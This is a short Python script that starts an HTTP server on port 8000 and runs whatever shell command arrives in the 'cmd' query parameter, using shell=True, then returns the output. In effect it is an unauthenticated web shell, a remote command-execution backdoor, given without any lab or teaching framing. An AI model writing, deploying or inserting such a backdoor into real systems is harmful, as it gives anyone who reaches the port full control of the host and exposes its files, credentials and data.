from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import os
from subprocess import STDOUT, check_output

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        query_components = parse_qs(urlparse(self.path).query)
        try:
          cmd = query_components["cmd"][0]
          res = check_output(cmd, stderr=STDOUT, timeout=1, shell=True)
          self.send_response(200)
          self.send_header('Content-type','text/plain')
          self.end_headers()
          self.wfile.write(res)
        except Exception:
          self.send_response(403)


with HTTPServer(('', 8000), handler) as server:
    server.serve_forever()